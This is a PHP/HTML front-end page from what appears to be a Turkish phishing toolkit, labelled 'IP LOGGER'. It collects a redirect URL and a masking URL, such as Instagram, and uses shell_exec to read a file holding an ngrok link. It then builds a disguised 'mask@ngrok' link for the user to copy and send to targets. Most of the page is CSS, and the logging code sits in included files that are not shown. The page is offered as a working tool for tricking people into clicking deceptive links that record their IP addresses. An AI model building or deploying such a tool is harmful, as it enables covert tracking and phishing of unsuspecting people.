<!DOCTYPE html>
<html lang="tr">
  <head>
<?php
include ("../../phishing_files/info-command.php");
?>
    <meta name="viewport" content="width=device-width">
    <meta charset="utf-8">
    <title>İP LOGGER</title>
<link rel="icon" href="https://www.flaticon.com/premium-icon/icons/svg/534/534621.svg" type="image/x-icon"/>
  <style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
@import url("https://fonts.googleapis.com/css?family=Roboto");
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  list-style:none;
  text-decoration: none;
}

body {
  margin: 0;
  padding: 0;
  background: black;
}
a {
  font-family: 'Poppins', sans-serif;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.red-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #e50000,
    0 0 40px #e50000,
    0 0 50px #e50000,
    0 0 100px #e50000;
}

.red-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}


.box{
  border: 0;
  margin-top: 80px;
  text-align: center;
  }
.box h1{
  color: white;
  font-size: 25px;
  text-transform: uppercase;
  font-weight: 500;
}
.box input[type = "url"],.box input[type = "text"]{
  border:0;
  background: none;
  display: block;
  margin: 30px auto;
  text-align: center;
  border: 2px solid #3498db;
  padding: 14px 10px;
  width: 200px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
}
.box input[type = "url"]:focus,.box input[type = "text"]:focus{
  width: 280px;
  border-color: #2ecc71;
}
.box input[type = "submit"]{
  border:0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #2ecc71;
  padding: 14px 40px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}
p {
  font-size: 12px;
  margin-top: 20px;
  padding: 5px 0;
  font-family: 'Poppins', sans-serif;
  color: #7CFC00;
}
.box input[type = "submit"]:hover{
  background: #2ecc71;
  
}
.info-box ul{
margin-top:-50px;
margin-bottom: 5px;
}
.create{
display: none;
}
.clear-box{
display: none;
}
.link-box{
background-image: radial-gradient( circle farthest-corner at 10% 20%,  rgba(14,174,87,1) 0%, rgba(12,116,117,1) 90% );
list-style: none;
text-decoration: none;
box-shadow: 0 0 20px grey;
background-image: radial-gradient( circle farthest-corner at 2.3% 23.2%,  rgba(0,232,253,1) 8.7%, rgba(7,53,122,1) 74.7% );
border-radius: 10px;
width: 300px;
height: 300px;
margin-top: 150px;
margin-left: 25px;
}
.link-box ul{
font-family: "Roboto", sans-serif;
display: block;
text-align: center;
padding-top: 15px;
font-size: 40px;
color: rgba(0,0,0, 0.5);
margin-bottom: 50px;
}

.link-box ul li{
font-family: "Roboto", sans-serif;
font-size: 15px;
}
.link-box ul .link{
margin-top: 45px;
}
.link-box ul li  input[type = "text"]{
  border:0;
  background: none;
  display: block;
  margin: 30px auto;
  text-align: center;
  border: 2px solid #3498db;
  padding: 5px 7px;
  width: 200px;
  outline: none;
  color: black;
  border-radius: 24px;
  transition: 0.25s;
}
.link-box ul li  input[type = "text"]:focus{
  width: 250px;
  border-color: #2ecc71;
}
.link-box ul li  button[type = "submit"]{
  border:0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #2ecc71;
  padding: 8px 15px;
  outline: none;
  color: black;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}
.link-box ul li  button[type = "submit"]:hover{
  padding: 10px 20px;
  border-color: black;
}
.link-box ul .close{
animation: close 2s infinite linear;
margin-top: 13px;
font-size: 25px;
display: inline-block;
padding: 10px;
border-radius: 15px;
}
@keyframes close {
50%{
font-size: 28px;
}}
.link-box-content{
display: none;
}
</style>

<?php
//echo "<script>alert()</script>";

if (isset($_GET['url'])){
	sleep (1);
	if (file_exists('refresh_url')){
	$mask = shell_exec('cat refresh_url |sed -n 2p');
	$ngrok_link = shell_exec('cat refresh_url |sed -n 3p');
echo "	
<div class='link-box'>
<ul> İP LOGGER
<li class='link'>
    <input type='text' class='text' value='$mask@$ngrok_link' />
    <button type='submit'>COPY</button>
</li>
<li class='close'><a href='$_SERVER[PHP_SELF]'>❌</a></li>
</ul>
<div>
<div class='clear-box'><div>
";
}}
?>
  </head>
  <body>

<form method='post' action="/phishing-tools/phishing_files/loading.php?refresh=/phishing-tools/ip-logger/interface/ip-logger.php">
<div class="box">
<?php
include ("../../phishing_files/info-box.php");
?>
<br><img src="https://image.flaticon.com/icons/png/512/4021/4021314.png" width="100" height="100" style="background: #7cfc00; border-radius:50px;"><br><br>
  <h1 class="green-neon">İP LOGGER</h1>
<p> Yönlendirelecek Adres = https://t.me/umutkaratools <br><br> Maskeleme Adresi = https://instagram.com</p>
  <input type="url" name="url_1" placeholder="Yönlendirelecek Adres.." autocomplete="off" required>
  <input type="url" name="url_2" placeholder="Maskeleme Adresi.." autocomplete="off" required>
  <input type="submit" name="" value="Start">
</div>
</form>
<script>
let copyText = document.querySelector(".link");
copyText.querySelector("button").addEventListener("click", function () {
  let input = copyText.querySelector("input.text");
  input.select();
  document.execCommand("copy");
  copyText.classList.add("active");
  window.getSelection().removeAllRanges();
  setTimeout(function () {
    copyText.classList.remove("active");
  }, 2500);
});

</script>
  </body>
</html>
